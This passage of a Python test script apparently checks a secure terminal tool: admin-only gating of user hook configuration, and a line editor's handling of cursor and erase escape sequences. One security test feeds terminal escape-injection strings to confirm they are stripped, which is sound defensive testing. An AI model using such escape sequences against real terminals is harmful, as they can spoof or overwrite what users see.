        with open(os.path.join(_pd, 'hooks.conf'), 'w') as _f:
            _f.write('hook_config_allow_user=true\n')
        ok(_hl.allow_user_config(), 'hooklib: an admin can allow user hook config')
        eq(_hl.read_file('ai-judge-prompt.txt'), 'USER PROMPT',
           'hooklib: home tier honored once allowed')
        # a home config CANNOT flip the gate (it is read from privileged only)
        with open(os.path.join(_hd, 'hooks.conf'), 'w') as _f:
            _f.write('hook_config_allow_user=false\n')
        ok(_hl.allow_user_config(), 'hooklib: home cannot turn its own gate off')
    finally:
        if _saved_xdg is None:
            os.environ.pop('XDG_CONFIG_HOME', None)
        else:
            os.environ['XDG_CONFIG_HOME'] = _saved_xdg

# --- feed_line_edits: the line-mode logical-cell editor -----------------------
def _line(raw, mode='strip', prev=None, col=0, sgr=None):
    """Feed raw into a fresh (or given) line buffer; return (completed_display,
    current_display) rendered under `mode`."""
    cells = prev if prev is not None else []
    comp, cells, col, _sgr, _w = S.feed_line_edits(cells, col, sgr or {}, raw)
    render = lambda cs: ''.join(S.render_output(c, mode) for c, _ in cs)
    return [render(c) for c in comp], render(cells), cells, col


# backspace over a reveal badge deletes the WHOLE character (the #119 fix): the
# shell emits \b (one logical cell) then erase-to-EOL; the 8-column badge goes.
_, cur, cells, col = _line('echo ' + chr(0x20AC), 'reveal')
eq(cur, 'echo <U+20AC>', 'reveal badge rendered')
_, cur, cells, col = _line('\b\x1b[K', 'reveal', prev=cells, col=col)
eq(cur, 'echo ', 'backspace+erase removes the whole reveal badge (#119)')

# history recall: \r, reprint, erase-to-EOL clears the longer previous line (#4)
_, _, cells, col = _line('echo aaaaaa')
_, cur, cells, col = _line('\rls\x1b[K', prev=cells, col=col)
eq(cur, 'ls', 'CSI K erases the residue of a longer recalled line (#4)')

# line-local CSI ops
eq(_line('abc\x1b[2DX')[1], 'aXc', 'CSI D (back) then overwrite')
eq(_line('abc\x1b[2GX')[1], 'aXc', 'CSI G (column) then overwrite')
eq(_line('ab\x1b[5CX')[1], 'abX', 'CSI C (forward) clamps at end of line')
eq(_line('abcdef\x1b[3G\x1b[K')[1], 'ab', 'CSI 0K erases from the cursor to EOL')
eq(_line('abc\x1b[2K')[1], '', 'CSI 2K erases the whole line')

# SECURITY: vertical / absolute cursor escapes are stripped -- a program can
# never leave the current line or reach the scrollback.
comp, cur, _, _ = _line('safe\x1b[2A\x1b[Hpwn\x1b[10;5H!')
eq((comp, cur), ([], 'safepwn!'),
   'vertical/absolute escapes stripped; everything stays on one line')
# and no escape byte ever survives into a cell
_, cur, _, _ = _line('a\x1b[31m\x1b]0;t\x07b\x1bZ', 'strip')
ok('\x1b' not in cur, 'no ESC byte survives feed_line_edits')

# --- result -------------------------------------------------------------------
sys.stdout.write('secure-terminal-tests: %d passed, %d failed\n' % (PASS, FAIL))
sys.exit(0 if FAIL == 0 else 1)
